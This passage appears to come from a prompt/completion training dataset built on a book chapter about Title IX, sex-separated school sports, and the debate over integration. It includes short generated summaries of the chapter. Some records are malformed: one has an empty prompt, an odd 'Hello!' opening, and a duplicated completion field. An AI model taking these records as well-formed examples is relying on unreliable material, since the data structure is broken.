will make the play, reinforcing the idea that she is not as capable as he is. This dynamic can be damaging to girls’ and women’s confidence and development as athletes. By having separate teams, women can develop their skills and confidence in an environment that values and supports their participation. Additionally, separate women’s sports programs can provide space for women to develop leadership skills and cultivate a sense of camaraderie and teamwork that is unique to women’s teams. Research has shown that women’s teams often have a different dynamic than men’s teams, with a focus on cooperation, communication, and support for one another. These qualities can be empowering for women and can contribute to their overall development as athletes and individuals. By fostering a sense of community and solidarity among female athletes, separate women’s sports programs can provide a space for women to excel and thrive in sports. In conclusion, the debate over sex separation in sports is a complex and nuanced one, with arguments on both sides about the best way to promote equality and opportunities for female athletes. While the goal of gender integration and equality is important, there are valid reasons for maintaining sex separation in sports to ensure that women have meaningful opportunities to participate and excel. By considering the benefits of separate women’s sports programs, we can create a more inclusive and empowering sports environment for girls and women."},{"prompt":"","completion":"Hello!

The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague. If she","completion":"tries to make the play, she risks being called off by the male player, reinforcing the notion that she is not as capable as her male counterparts. This dynamic can undermine women's confidence, skills, and enjoyment of sports, ultimately discouraging them from participating at all. In summary, the text discusses the dominant principle in modern antidiscrimination law, particularly in the context of gender equality in sports. It explores the tension between a gender-blind approach that emphasizes individual rights and a group-based approach that prioritizes increasing overall opportunities for women in sports. The text argues that the baseline of separation, rather than integration, is necessary to protect and expand women's competitive sports opportunities and create an empowering experience for female athletes."},{"prompt":"What is being said in the text in a long answer? The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a 